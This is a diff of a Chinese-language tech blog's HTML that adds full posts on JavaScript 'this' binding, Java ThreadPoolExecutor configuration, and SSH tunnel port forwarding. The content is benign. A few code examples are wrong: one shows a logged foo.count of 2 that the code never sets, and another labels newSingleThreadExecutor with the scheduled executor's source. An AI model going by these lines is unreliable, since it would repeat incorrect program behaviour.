+重新執行以上的程式就會發現 <code>foo.count</code> 變成 2 了！</p>
+<p>然而要如何尋找呼叫位置以及善用 this 就是一件學問了<br>
+而用 this 有什麼好處? 看看以下這段 code</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( <span class="string">`foo: <span class="subst">$&#123;num&#125;</span>`</span>)</span><br><span class="line">    data.count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">7</span>) &#123;</span><br><span class="line">        foo(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// foo: 8</span></span><br><span class="line"><span class="comment">// foo: 9</span></span><br><span class="line"><span class="comment">// foo 被調用多少次</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.count) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p>
+<p>沒有用 this 去做綁定，而是用一個變量的方式去儲存<br>
+雖然這樣一樣看達到效果，但這看起來就不太簡潔未來要重複使用也很不方便<br>
+而這就是學好 this 的好處之一</p>
+<p>看到這邊應該會 this 有簡單的理解了<br>
+那對於以下這段 code 應該就能清楚知道會出現什麼結果了</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identify</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">speak</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> greeting = <span class="string">"I 'm"</span> + identify.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(greeting)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> me = &#123;</span><br><span class="line">    name: <span class="string">"Jack"</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> you = &#123;</span><br><span class="line">    name: <span class="string">"Reader"</span></span><br><span class="line">&#125;</span><br><span class="line">identify.call(me) <span class="comment">// Jack</span></span><br><span class="line">identify.call(you) <span class="comment">// Reader</span></span><br><span class="line"></span><br><span class="line">speak.call(me) <span class="comment">// Jack</span></span><br><span class="line">speak.call(you) <span class="comment">// Reader</span></span><br></pre></td></tr></table></figure></p>
+<h2><span id="this-綁定規則">this 綁定規則</span></h2>
+<p>前面提到要如何去找到調用位置是重要的事之外<br>
+還要理解 js 中是有哪些規則去綁定 this 的<br>
+以下會開始介紹 js 的幾種綁定方式<br>
+但就個人來說，盡量使用顯示綁定的方式去把 this 綁定到對的對象上面才是正確的做法</p>
+<h3><span id="default-binding-默認綁定">Default Binding (默認綁定)</span></h3>
+<p>這條為無法應用其他規則的時候，默認會出現的綁定模式<br>
+請看以下的 code</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">foo(); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p>
+<p>這邊可以注意到 <code>var a = 2</code> 是在全域下的一個全局變量<br>
+所以裡面的 <code>this.a</code> 是指向到全域的變量 a<br>
+還有個方法可以確認說有沒有真的綁定到，可以透過 <code>use strict</code> 嚴格模式去做測試</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    "use strict"</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">foo(); <span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure></p>
+<h3><span id="implicit-binding-隱式綁定">Implicit Binding (隱式綁定)</span></h3>
+<p>這條隱式綁定的規則，則是要取決於上下文</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    a: <span class="number">2</span>,</span><br><span class="line">    foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = obj.foo;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"HIHI"</span>; <span class="comment">// Global</span></span><br><span class="line">bar(); <span class="comment">// "HIHI"</span></span><br></pre></td></tr></table></figure></p>
+<p>雖然 bar 是 obj.foo 的一個引用，但實際上它是對應到 foo 上<br>
+還有一種狀況很特別，當把 function 當成 args 傳進去執行</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doFoo</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    fn()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    a: <span class="number">2</span>,</span><br><span class="line">    foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = obj.foo;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"HIHI"</span>; <span class="comment">// Global</span></span><br><span class="line">doFoo(obj.foo); <span class="comment">// "HIHI"</span></span><br></pre></td></tr></table></figure></p>
+<p>這邊可以發現當把函數存進去後, <code>obj.foo</code> 的 <code>this</code> 是被綁定在 global 上</p>
+<h3><span id="explicit-binding-顯式綁定">Explicit Binding (顯式綁定)</span></h3>
+<p>顯式綁定會透過三個函數去使用<br>
+<code>call</code> <code>apply</code> <code>bind</code> 的方式去做到這件事<br>
+做法的話，前面應該有看到過了，這邊重新複習一下</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    a: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line">foo.call(obj); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p>
+<p>這邊可以注意到我們把 foo 裡面的 <code>this.a</code> 綁定到 obj 上面了</p>
+<h3><span id="new-binding">new Binding</span></h3>
+<p>先說明 js 之中的 new 和其他 class 類型的語言是完全不一樣的東西<br>
+在 js 之中使用 new，並不會真的屬於什麼類或是實例化一個類 (嚴格來說 js 中也沒有所謂的類，全部都是物件)<br>
+而在使用 new 的時候會有以下幾個步驟</p>
+<ol>
+<li>創建全新物件</li>
+<li>新物件會被執行原型鏈的連接</li>
+<li>新物件會綁定到函數調用的 this</li>
+<li>如果函數沒有返回其他物件，那麼 new 會自動返回這個新物件，若有返回其他物件，則替換掉新物件</li>
+</ol>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.a = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> foo(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(bar.a); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p>
+<p>以上的範例來說明上面的四個步驟<br>
+bar 為 <em>創建全新物件</em>，建立出 bar 之後會對 Object 的<em>原型鍊做連接</em> (這裡暫時不提)<br>
+因為 bar 為新物件，所以根據<em>新物件會綁定到函數調用的 this</em><br>
+這時 bar 就會被綁定在 foo 函數裡面的 this 去了<br>
+那因為在使用 <code>new foo(2)</code> 時，並沒有<em>返回其他物件</em>，所以這裡會把 bar 回傳回去<br>
+但如果這時有返回其他物件，這時候就會把 bar 也改替換掉了<br>
+這時第三步原本是把 this 綁定在 bar 本身，這時會變成綁定在其他物件身上<br>
+參考以下 code</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line">    a: <span class="string">"hihi"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.a = a;</span><br><span class="line">    <span class="keyword">return</span> test;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> foo(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(bar.a); <span class="comment">// "hihi"</span></span><br></pre></td></tr></table></figure></p>
+<p>不過如果回傳的並不是物件的話，狀況又會不一樣了</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.a = a;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> foo(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(bar.a); <span class="comment">// "2"</span></span><br></pre></td></tr></table></figure></p>
+<h2><span id="後記">後記</span></h2>
+<p>這是看完 You don't know JS 後做的一篇整理<br>
+如果有任何錯誤歡迎指教！<br>
+而整本書對於 this 的解釋非常詳細，如果有興趣的讀者可以找找這本書看看原文是如何寫的吧！<br>
+後續會再找時間整理關於 prototype (原形鏈) 的原理</p>
+
         </div>
         
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/04/24/javascript-this/#more">繼續閱讀</a>
-                </div>
-            </div>
-        </div>
         
         
     </div>
@@ -478,18 +958,127 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Thread Pool 的概念和使用 Database 的 Connection Pool 是很類似的概念<br>就像 Connection Pool 的使用方法是去 Pool 裡面取得一個 Connection 使用<br>使用完之後就關閉此 Connection，並把這個 Connection 丟回 Pool 之中讓其他程式使用</p>
-<p>Thread Pool 也是這種概念，但在 JDK 1.5 之前的版本中是沒有一個管控的方式<br>幾乎都是用 new Thread 的方式去創建使用<br>在 JDK 1.5 之後的版本則是出了 Exectuor 去管控 Thread Pool</p>
+            <h2><span id="前言">前言</span></h2>
+<p>Thread Pool 的概念和使用 Database 的 Connection Pool 是很類似的概念
+就像 Connection Pool 的使用方法是去 Pool 裡面取得一個 Connection 使用
+使用完之後就關閉此 Connection，並把這個 Connection 丟回 Pool 之中讓其他程式使用</p>
+<p>Thread Pool 也是這種概念，但在 JDK 1.5 之前的版本中是沒有一個管控的方式
+幾乎都是用 new Thread 的方式去創建使用
+在 JDK 1.5 之後的版本則是出了 Exectuor 去管控 Thread Pool</p>
+<p>&lt;!-- more --&gt;</p>
+<h2><span id="threadpoolexecutor-介紹">ThreadPoolExecutor 介紹</span></h2>
+<p>Java 提供了 ThreadPoolExecutor 能讓我們客製化定義不同的使用模式
+以下為 ThreadPoolExecutor 的設定即使用方法
+以及取用 Queue Size 以及 Thread Name 的方式</p>
+<p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ThreadPoolExecutor executor = <span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">    <span class="keyword">int</span> corePoolSize,</span><br><span class="line">    <span class="keyword">int</span> maxPoolSize,</span><br><span class="line">    <span class="keyword">long</span> keepAliveTime,</span><br><span class="line">    TimeUnit unit,</span><br><span class="line">    BlockingQueue&lt;Runnable&gt; workQueue,</span><br><span class="line">    RejectedExecutionHandler handler</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">"Queue size is: "</span> + executor.getQueue().size());</span><br><span class="line"></span><br><span class="line">executor.execute(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"running"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Thread Name: "</span> + Thread.currentThread().getName())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>corePoolSize
+核心 Thread 的數量，基本上 Thread 數量不會低於此數字</li>
+<li>maxPoolSize
+Thread Pool 的最大數量，如果所有 Thread 都被執行的話
+Task 會被塞到 Queue 之中等到有空閒的 Thread 為止
+決定 maxPoolSize 的數量最好是根據系統資源去計算出來
+<code>Runtime.getRuntime().availableProcessors();</code></li>
+<li>keeyAliveTime
+當閒置時間超過此設定的時間的話，系統會開始回收 corePoolSize 以上多餘的 Thread</li>
+<li>unit
+keepAliveTime 的時間單位，可以使用 <code>TimeUnit.SECONDS</code></li>
+<li>workQueue
+決定當所有 Thread 都被執行時，Task 在 Queue 之中會以何種形式等待</li>
+<li>handler
+Queue 已滿且 Thread 已達到 maxPoolSize 之後會以什麼樣的方式處理新的 Task</li>
+</ul>
+<h3><span id="blockingqueue-詳細介紹">BlockingQueue 詳細介紹</span></h3>
+<p>基本規則為</p>
+<ol>
+<li>如果當前的 Thread 小於 corePoolSize，則 Executor 首先會新增 Thread，而不會把 Task 丟到 Queue 之中 (基本上就是直接運行的意思)</li>
+<li>如果當前的 Thread 大於等於 corePoolSize，則 Executor 首先會把 Task 加到 Queue 之中等待</li>
+<li>當 Task 無法再被加入到 Queue 之中的話，則 Executor 首先會創建新的 Thread，直到超過 maxPoolSize 為止</li>
+<li>超過 maxPoolSize 時，任務會被拒絕</li>
+</ol>
+<p>BlockingQueue 有三種類型</p>
+<h4><span id="直接提交">直接提交</span></h4>
+<p>代表類型: synchronousQueue
+基本上就 Queue Size 就是 0
+會直接把 Task 提交給 Thread，如果不存在可用 Thread，則新建一個
+如果此類型有設置 maxPoolSize 的話，是有可會拒絕新的 Task
+所以通常使這種類型，會建議 maxPoolSize 不要做上限設定</p>
+<h4><span id="無界隊列-unbounded-queue">無界隊列 (Unbounded Queue)</span></h4>
+<p>代表類型: LinkedBlockingQueue
+Queue 的大小是無限制的
+特別注意的是因為大小是無限制，所以萬一 Task 執行時間過長
+會導致有大量個 Task 卡在 Queue 之中動彈不得，進而導致 OOM 的發生
+<code>Executors.newFixedThreadPool</code> 採用的就是此種類型的 Queue</p>
+<h4><span id="有界隊列-bounded-queue">有界隊列 (Bounded Queue)</span></h4>
+<p>代表類型: ArrayBlockingQueue
+Queue 的大小是有限制的
+但要注意的點是，這個 Queue 大小必須和 Thread Pool 相互搭配才可以發揮出比較好的效能
+使用大的 Queue Size 和小的 Thread Pool Size
+雖然可以有效降低 CPU 使用率，但會降低 QPS
+而使用小的 Queue Size 和大的 Thread Pool Size
+雖然可以提昇 QPS，但會降低 CPU</p>
+<h3><span id="queue-飽和-rejectexecutionhandle-介紹">Queue 飽和 RejectExecutionHandle 介紹</span></h3>
+<p>再來要介紹當 Queue 飽和之後，可以根據不同 handle 做出不一樣的行為
+以下總計有四種使用方式</p>
+<h4><span id="終止策略-abortpolicy">終止策略 (AbortPolicy)</span></h4>
+<p><strong><em>此為預設 Policy</em></strong>
+使用該 Policy，飽和時會拋出 RejectedExecutionException
+調用者可以用以下自行定義方式處理異常</p>
+<p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">executor.setRejectedExecutionHandler(<span class="keyword">new</span> RejectedExecutionHandler() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rejectedExecution</span><span class="params">(Runnable r, ThreadPoolExecutor executor)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Get you!"</span>);</span><br><span class="line">        r.run();</span><br><span class="line">        System.out.println(<span class="string">"Done in handler"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<h4><span id="拋棄策略-discardpolicy">拋棄策略 (DiscardPolicy)</span></h4>
+<p>不做任何處理直接拋棄</p>
+<h4><span id="拋棄舊任務策略-discardoldestpolicy">拋棄舊任務策略 (DiscardOldestPolicy)</span></h4>
+<p>把 Queue 之中最頭的元素拋棄，並在嘗試重新提交 Task</p>
+<h4><span id="調用者運行策略-callerrunspolicy">調用者運行策略 (CallerRunsPolicy)</span></h4>
+<p>簡單來說，飽和後會直接由調用 Thread Pool 的主 Thread 自己來執行這個 Task
+但在這個期間，主 Thread 就無法再度提交 Task
+從而讓 Thread Pool 有時間把正在處理的 Task 給完成</p>
+<h2><span id="創建-thread-pool-的四個常用方法">創建 Thread Pool 的四個常用方法</span></h2>
+<p>這四個常用的方法都是透過 ThreadPoolExecutor 的不同參數所實作而成的</p>
+<ol>
+<li>
+<p><code>public static ExecutorService newFixedThreadPool(int nThreads)</code>
+創建固定數量的 Thead，提交 Task 的時候如果未達 <code>nThreads</code> 的數量的話，則會一直新建 Thread
+達到 <code>nThreads</code> 時，之後的 Task 則會進入到佇列中</p>
+<p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newFixedThreadPool</span><span class="params">(<span class="keyword">int</span> nThreads)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(nThreads, nThreads,</span><br><span class="line">                                  <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                  <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</li>
+<li>
+<p><code>public static ExecutorService newCachedThreadPool()</code>
+Thread 的數量預設上限為 2^31 - 1，如果當 Thread 大於 Tasks 數量的時候
+就會開始去回收那些等了超過 60 秒還沒有 Task 進來的 Thread
+問題是，這個 <code>newCachedThreadPool</code> 是屬於動態新建所以萬一 Task 一直大於 Thread 數量的話則會一直新建
+這樣很容易耗光機器資源，使用這個最好的狀況是 Task 的執行時間是短的才比較適合</p>
+<p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newCachedThreadPool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">0</span>, Integer.MAX_VALUE,</span><br><span class="line">                                  <span class="number">60L</span>, TimeUnit.SECONDS,</span><br><span class="line">                                  <span class="keyword">new</span> SynchronousQueue&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</li>
+<li>
+<p><code>public static ExecutorService newSingleThreadExecutor()</code>
+創建一個 Single Thread，因為此 Thread 被使用的話其他都會是在佇列中等待，所以效能會下降</p>
+<p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ScheduledExecutorService <span class="title">newSingleThreadScheduledExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> DelegatedScheduledExecutorService</span><br><span class="line">        (<span class="keyword">new</span> ScheduledThreadPoolExecutor(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</li>
+<li>
+<p><code>public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize)</code>
+支持定時以及週期性執行 Task 的需求</p>
+<p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ScheduledExecutorService <span class="title">newScheduledThreadPool</span><span class="params">(<span class="keyword">int</span> corePoolSize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ScheduledThreadPoolExecutor(corePoolSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>看看 Parent Class</p>
+<p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ScheduledThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(corePoolSize, Integer.MAX_VALUE, <span class="number">0</span>, NANOSECONDS,</span><br><span class="line">          <span class="keyword">new</span> DelayedWorkQueue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</li>
+</ol>
+<p>但是基本上不是很推薦使用以上這四種方法去定義 Thread Pool
+在阿里巴巴的 Java 開發手冊中也有提到，如果要新建 Thread
+請透過 ThreadPoolExecutor 的方式去自定義 Thread Pool 的使用模式
+在<a href="https://zhuanlan.zhihu.com/p/32867181">這篇文章</a>的樓主也是因為用了以上其中一個方法採到 OOM 的雷
+所以在設定 Thread Pool 的時候要特別注意使用的情況適不適合！</p>
+<h2><span id="references">References</span></h2>
+<ol>
+<li><a href="https://www.cnblogs.com/vhua/p/5297587.html">Java Executor并发框架</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/32867181">一次Java线程池误用引发的血案和总结</a></li>
+<li><a href="http://givemepass-blog.logdown.com/posts/296960-how-to-use-the-threadpool">如何使用ThreadPool</a></li>
+<li><a href="http://wiki.jikexueyuan.com/project/java-concurrency/executor.html">并发新特性—Executor 框架与线程池</a></li>
+<li><a href="https://howtodoinjava.com/java/multi-threading/how-to-use-blockingqueue-and-threadpoolexecutor-in-java/">Java ThreadPoolExecutor and BlockingQueue Example</a></li>
+</ol>
+
         </div>
         
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/02/19/java-executor/#more">繼續閱讀</a>
-                </div>
-            </div>
-        </div>
         
         
     </div>
@@ -534,16 +1123,53 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         </h1>
         <div class="content">
             <p>這篇主要在介紹 SSH Tunnel 是什麼東西以及教學如何使用</p>
+<p>&lt;!-- more --&gt;</p>
+<h2><span id="使用情境介紹">使用情境介紹</span></h2>
+<p>一般來說會使用到 SSH Tunnel 的其中一個情境會是這樣子的</p>
+<p>這裡有兩台機器，分別為 A B
+B 為重要的服務或是資料
+A 為我們本身的主機，作為本地端開發時使用的 (開發會需要用到 B 的服務或是資料)</p>
+<p>這時候我們總不能每一次在 A 把程式打完，就一次一次把程式放到 B 上面去跑
+這件事實在是太麻煩了（汗
+所以可以的話希望可以直接在 A 機器上面就能夠讀取到 B 的服務或是資料
+這樣的話就能夠方便直接在本地開發
+而要達成這件事情的方法就是透過 SSH Tunnel 的方式去達成</p>
+<h2><span id="ssh-tunnel-介紹">SSH Tunnel 介紹</span></h2>
+<p>SSH Tunnel 在者裡面扮演的角色可以這樣思考</p>
+<p>你在住家附近有一口水井，但你水井完全是沒有水可以取用
+然後在距離很遠的地方有一個水庫，要喝水的必須到水庫取水並放回住家附近的水井
+有一個作法就是，把水井和水庫之間挖一條通道，讓水庫的水直接導入到水井
+這個<code>通道</code>就是我們 SSH Tunnel 扮演的角色</p>
+<p>而用比較技術的說法的話，SSH Tunnel 就是做到了 Port Forwarding 的功用</p>
+<h2><span id="ssh-tunnel-使用方式">SSH Tunnel 使用方式</span></h2>
+<p>這邊主要會是用 Linux 原生指令 ssh 去完成 SSH Tunnel
+在這之前我們先回想一下 ssh 連線的方式！</p>
+<p>當已經有一台 server 上面跑著一個網頁的服務
+而你可以透過以下指令 ssh 連線到那一台 server 上
+<code>ssh root@127.0.0.1</code>
+ssh 連線上去之後，上面有跑一個 Nginx 的服務在 80 port
+這時候在 server 上執行 <code>curl localhost</code> 會發現有成功回傳 Nginx 的 Hello 頁面</p>
+<p>此時如果你想要在自己的電腦上就能讀取這個網頁或是資料庫該怎麼辦?
+這邊我們就要介紹 <code>-L</code> 這個 option 可以幫你達成這個目標！
+Template: <code>ssh -L [local_port]:localhost:[remote_port] root@127.0.0.1</code></p>
+<p>所以如果我要把 server 上的 80 port 網頁服務導入到本地端的 8080 port 該怎麼做呢?
+可以使用以下這行指令
+<code>ssh -L 8080:localhost:80 root@127.0.0.1</code>
+然後在瀏覽器打開 http://localhost:8080 即可看到 server 上面的網頁！</p>
+<p>接著又有另一種情境出現了
+就是在 server 上要讀取 local port 的服務的時候該怎麼辦呢?
+這裡就可以使用另一種相反的方式，也就是透過 <code>-R</code> 去達成
+<code>-R</code> 簡單來說就是反過來，你可以把本地機器上的服務 port 導入到 server 讓他連線！
+Template: <code>ssh -R [remote_port]:localhsot:[local_port] root@127.0.0.1</code></p>
+<p>舉例來說，在本地端起了一個 8080 port 的服務
+如果要在 server 上 6666 port 讀取的話可以透過以下方式取得！
+<code>ssh -R 6666:localhost:8080 root@127.0.0.1</code></p>
+<h2><span id="後記">後記</span></h2>
+<p>最近還蠻常會使用到這個方式去連線，於是在這邊特別把它記錄下來
+然而這種方式只是圖個方便，需要的時候做個 forwarding 而已</p>
+
         </div>
         
-        
